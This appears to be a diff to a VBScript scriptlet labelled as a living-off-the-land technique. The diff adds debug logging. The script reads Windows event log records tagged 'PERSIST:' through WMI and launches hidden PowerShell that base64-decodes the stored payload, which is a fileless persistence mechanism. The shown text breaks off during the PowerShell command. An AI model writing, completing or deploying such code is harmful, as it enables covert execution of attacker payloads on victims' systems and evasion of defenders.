@@ -2,39 +2,52 @@
 <script language="VBScript">
 On Error Resume Next
 
-Dim eventMessage
-eventMessage = ""
+Dim objShell
+Set objShell = CreateObject("WScript.Shell")
+objShell.LogEvent 0, "LOTL DEBUG: .sct triggered"
 
 Dim objWMIService
 Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
-If Err.Number <> 0 Then WScript.Quit
+If Err.Number <> 0 Then
+    objShell.LogEvent 1, "LOTL DEBUG: WMI connect failed " & Err.Number
+    WScript.Quit
+End If
+objShell.LogEvent 0, "LOTL DEBUG: WMI connected"
 
-' Query System log for Wininit Event ID 19 records with PERSIST: prefix
 Dim colEvents
 Set colEvents = objWMIService.ExecQuery( _
     "SELECT * FROM Win32_NTLogEvent WHERE SourceName = 'Wininit' AND EventCode = 19 " & _
     "ORDER BY TimeGenerated DESC")
-If Err.Number <> 0 Then WScript.Quit
+If Err.Number <> 0 Then
+    objShell.LogEvent 1, "LOTL DEBUG: WMI query failed " & Err.Number
+    WScript.Quit
+End If
+objShell.LogEvent 0, "LOTL DEBUG: WMI query OK"
+
+Dim eventMessage
+eventMessage = ""
 
 Dim objEvent
+Dim count
+count = 0
 For Each objEvent In colEvents
+    count = count + 1
     On Error Resume Next
     Dim rawData
     rawData = objEvent.InsertionStrings(0)
     If Err.Number = 0 And Len(rawData) > 8 Then
         If Left(rawData, 8) = "PERSIST:" Then
             eventMessage = Mid(rawData, 9)
+            objShell.LogEvent 0, "LOTL DEBUG: Found PERSIST record, len=" & Len(eventMessage)
             Exit For
         End If
     End If
     Err.Clear
 Next
 
-If Len(eventMessage) = 0 Then WScript.Quit
+objShell.LogEvent 0, "LOTL DEBUG: Scanned " & count & " records, found=" & (Len(eventMessage) > 0)
 
-Dim objShell
-Set objShell = CreateObject("WScript.Shell")
-If Err.Number <> 0 Then WScript.Quit
+If Len(eventMessage) = 0 Then WScript.Quit
 
 objShell.Run "powershell -NoProfile -NonInteractive -WindowStyle Hidden -Command """ & _
     "$b=[Convert]::FromBase64String('" & eventMessage & "');" & _
